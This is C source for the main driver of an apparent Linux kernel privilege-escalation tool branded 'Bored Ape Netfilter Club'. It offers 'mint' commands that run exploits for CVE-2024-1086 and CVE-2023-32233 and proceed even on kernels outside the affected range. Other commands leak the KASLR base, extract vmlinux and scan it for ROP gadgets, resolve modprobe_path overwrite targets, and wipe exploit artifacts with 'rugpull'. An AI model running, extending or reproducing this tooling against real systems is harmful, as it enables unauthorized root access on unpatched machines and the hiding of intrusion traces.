#include "nfttables.h"
#include "arch.h"
#include "offsets.h"
#include <getopt.h>

struct nfttables_state G;

static void banner(void)
{
    fprintf(stderr,
        "\n"
        "  " C_BOLD "NFTtables" C_RST C_DIM " v0.1.0" C_RST "\n"
        "  " C_DIM "Bored Ape Netfilter Club" C_RST "\n"
        "  " C_DIM "\"Not your keys, not your kernel\"" C_RST "\n"
        "\n"
    );
}

static void usage(const char *argv0)
{
    banner();
    fprintf(stderr,
        "Usage: %s <command> [options]\n"
        "\n"
        "Commands:\n"
        "  wallet         Show current privilege state\n"
        "  collections    List available exploits\n"
        "  mint [id]      Escalate privileges (auto-select or specify)\n"
        "  check [id]     Probe for vulnerability without exploiting\n"
        "  scan           Resolve kernel offsets, slab info, gadgets\n"
        "  extract        Extract vmlinux from /boot for gadget scanning\n"
        "  info           Full recon: version, offsets, vulns, slab state\n"
        "  rugpull        Clean up exploit artifacts\n"
        "\n"
        "Mint IDs:\n"
        "  1086           CVE-2024-1086 (verdict double-free)\n"
        "  32233          CVE-2023-32233 (anonymous set UAF)\n"
        "  auto           Auto-detect best exploit (default)\n"
        "\n"
        "Options:\n"
        "  -v, --verbose  Verbose output\n"
        "  -h, --help     This message\n"
        "\n",
        argv0
    );
}

static void cmd_collections(void)
{
    pr_info("");
    pr_info(APE " " C_BOLD "Bored Ape Netfilter Club" C_RST);
    pr_info(C_DIM "  \"Right-click save this privilege escalation\"" C_RST);
    pr_info("");

    fprintf(stderr,
        "  " C_BOLD "#1086" C_RST "   CVE-2024-1086  verdict double-free\n"
        "          " C_DIM "3.15-6.7.1 | dirty pagetable | reliability: high" C_RST "\n"
        "\n"
        "  " C_BOLD "#32233" C_RST "  CVE-2023-32233  anonymous set UAF\n"
        "          " C_DIM "3.18-6.3.1 | heap spray + ROP | reliability: medium" C_RST "\n"
        "\n"
    );
}

static int parse_mint_id(const char *s)
{
    if (!s || strcmp(s, "auto") == 0)
        return MINT_AUTO;
    if (strcmp(s, "1086") == 0)
        return MINT_CVE_2024_1086;
    if (strcmp(s, "32233") == 0)
        return MINT_CVE_2023_32233;
    fprintf(stderr, "unknown mint ID: %s\n", s);
    return -1;
}

static int cmd_mint(int requested_id)
{
    int target_id = requested_id;

    if (target_id == MINT_AUTO) {
        pr_info(PICK "Auto-selecting exploit for kernel %s...", G.ki.release);
        target_id = pick_exploit(&G.ki);
        if (target_id < 0) {
            pr_fail("No exploit available for this kernel version");
            pr_info("  " C_DIM "run 'collections' to see supported ranges" C_RST);
            return 1;
        }
    }

    bool vuln = false;
    switch (target_id) {
    case MINT_CVE_2024_1086:
        vuln = version_in_range(&G.ki, 3, 15, 0, 6, 7, 1);
        break;
    case MINT_CVE_2023_32233:
        vuln = version_in_range(&G.ki, 3, 18, 0, 6, 3, 1);
        break;
    }

    if (!vuln) {
        pr_warn("Kernel %s may be outside the affected range", G.ki.release);
        pr_info("  " C_DIM "(proceeding anyway, distro backports exist)" C_RST);
    }

    if (!G.ki.nft_available) {
        pr_fail("Netfilter netlink unavailable (module not loaded?)");
        pr_info("  " C_DIM "try: modprobe nf_tables" C_RST);
        return 1;
    }

    switch (target_id) {
    case MINT_CVE_2024_1086:
        return mint_cve_2024_1086(&G.ki);
    case MINT_CVE_2023_32233:
        return mint_cve_2023_32233(&G.ki);
    default:
        pr_fail("Unknown exploit ID");
        return 1;
    }
}

/* ── scan command ─────────────────────────────────────────────── */

static int cmd_scan(void)
{
    pr_info(PICK "Scanning kernel environment...");
    pr_info("");

    struct kernel_offsets ko;
    offsets_resolve(&ko, G.ki.release);
    offsets_print(&ko);

    /* report exploit readiness */
    pr_info(APE " " C_BOLD "Exploit readiness:" C_RST);
    pr_info("");

    /* CVE-2024-1086: needs modprobe_path or core_pattern */
    bool can_1086 = version_in_range(&G.ki, 3, 15, 0, 6, 7, 1);
    fprintf(stderr, "  #1086  ");
    if (!can_1086)
        fprintf(stderr, C_RED "kernel not vulnerable" C_RST "\n");
    else if (ko.modprobe_path || ko.core_pattern)
        fprintf(stderr, C_GRN "ready" C_RST " (overwrite target resolved)\n");
    else
        fprintf(stderr, C_YEL "partial" C_RST " (need kallsyms or vmlinux for target addr)\n");

    /* CVE-2023-32233: needs gadgets + cred functions */
    bool can_32233 = version_in_range(&G.ki, 3, 18, 0, 6, 3, 1);
    fprintf(stderr, "  #32233 ");
    if (!can_32233)
        fprintf(stderr, C_RED "kernel not vulnerable" C_RST "\n");
    else if ((ko.resolved & OFF_GADGETS) && (ko.resolved & OFF_CRED_FUNCS))
        fprintf(stderr, C_GRN "ready" C_RST " (gadgets + cred funcs resolved)\n");
    else if (ko.modprobe_path)
        fprintf(stderr, C_YEL "partial" C_RST " (fallback: modprobe_path overwrite)\n");
    else
        fprintf(stderr, C_RED "not ready" C_RST " (need gadgets or modprobe_path)\n");

    pr_info("");
    return 0;
}

/* ── extract command ──────────────────────────────────────────── */

static int cmd_extract(const char *outpath)
{
    char vmlinuz[256];

    if (vmlinux_find_boot_image(vmlinuz, sizeof(vmlinuz)) < 0) {
        pr_fail("No boot image found for kernel %s", G.ki.release);
        return 1;
    }

    pr_info(PICK "Extracting vmlinux from %s...", vmlinuz);

    const char *out = outpath ? outpath : "/tmp/.nft_vmlinux";
    if (vmlinux_extract(vmlinuz, out) < 0) {
        pr_fail("Extraction failed (check decompressor tools: gzip, xz, lz4, zstd)");
        return 1;
    }

    struct stat st;
    stat(out, &st);
    pr_ok("Extracted to %s (%ld bytes)", out, st.st_size);

    /* optionally scan for gadgets */
    pr_info(PICK "Scanning for gadgets...");
    struct kernel_offsets ko = {0};
    ko.kernel_base = kaslr_leak_base();
    int n = gadgets_scan(out, &ko);
    if (n > 0)
        pr_ok("Found %d gadgets", n);
    else
        pr_warn("No gadgets found (binary may be stripped or wrong format)");

    offsets_print(&ko);
    return 0;
}

/* ── info command ─────────────────────────────────────────────── */

static int cmd_info(void)
{
    banner();
    wallet_print(&G.wallet, &G.ki);

    /* vulnerability assessment */
    pr_info(APE " " C_BOLD "Vulnerability Assessment" C_RST);
    pr_info("");

    bool any = false;

    if (version_in_range(&G.ki, 3, 15, 0, 6, 7, 1)) {
        pr_info("  " C_GRN "#1086" C_RST "  CVE-2024-1086  " C_GRN "VULNERABLE" C_RST);
        any = true;
    } else {
        pr_info("  " C_DIM "#1086  CVE-2024-1086  not affected" C_RST);
    }

    if (version_in_range(&G.ki, 3, 18, 0, 6, 3, 1)) {
        pr_info("  " C_GRN "#32233" C_RST " CVE-2023-32233  " C_GRN "VULNERABLE" C_RST);
        any = true;
    } else {
        pr_info("  " C_DIM "#32233 CVE-2023-32233  not affected" C_RST);
    }

    pr_info("");

    if (!any) {
        pr_info("  " C_DIM "Kernel %s appears patched for both CVEs." C_RST, G.ki.release);
        pr_info("  " C_DIM "Note: distro backport detection may have false negatives." C_RST);
    }

    if (!G.ki.userns_available) {
        pr_warn("User namespaces unavailable (both exploits need them)");
    }
    if (!G.ki.nft_available) {
        pr_warn("nftables netlink unavailable");
    }

    pr_info("");
    return 0;
}

/* ── main ─────────────────────────────────────────────────────── */

static struct option long_opts[] = {
    {"verbose", no_argument, NULL, 'v'},
    {"help",    no_argument, NULL, 'h'},
    {NULL, 0, NULL, 0},
};

int main(int argc, char **argv)
{
    memset(&G, 0, sizeof(G));

    int c;
    while ((c = getopt_long(argc, argv, "vh", long_opts, NULL)) != -1) {
        switch (c) {
        case 'v': G.verbose = 1; break;
        case 'h': usage(argv[0]); return 0;
        default:  usage(argv[0]); return 1;
        }
    }

    if (optind >= argc) {
        usage(argv[0]);
        return 1;
    }

    const char *cmd = argv[optind];

    if (detect_kernel(&G.ki) < 0) {
        pr_fail("Could not detect kernel version");
        return 1;
    }
    wallet_read(&G.wallet);

    if (strcmp(cmd, "wallet") == 0) {
        banner();
        wallet_print(&G.wallet, &G.ki);
        return 0;
    }

    if (strcmp(cmd, "collections") == 0) {
        cmd_collections();
        return 0;
    }

    if (strcmp(cmd, "mint") == 0) {
        banner();
        const char *id_str = (optind + 1 < argc) ? argv[optind + 1] : NULL;
        int id = parse_mint_id(id_str);
        if (id < 0) return 1;
        G.check_only = 0;
        return cmd_mint(id);
    }

    if (strcmp(cmd, "check") == 0) {
        banner();
        const char *id_str = (optind + 1 < argc) ? argv[optind + 1] : NULL;
        int id = parse_mint_id(id_str);
        if (id < 0) return 1;
        G.check_only = 1;
        pr_info(C_DIM "(dry run: probing vulnerability, not exploiting)" C_RST);
        return cmd_mint(id);
    }

    if (strcmp(cmd, "scan") == 0) {
        banner();
        return cmd_scan();
    }

    if (strcmp(cmd, "extract") == 0) {
        banner();
        const char *out = (optind + 1 < argc) ? argv[optind + 1] : NULL;
        return cmd_extract(out);
    }

    if (strcmp(cmd, "info") == 0) {
        return cmd_info();
    }

    if (strcmp(cmd, "rugpull") == 0) {
        banner();
        return rugpull();
    }

    fprintf(stderr, "unknown command: %s\n", cmd);
    usage(argv[0]);
    return 1;
}
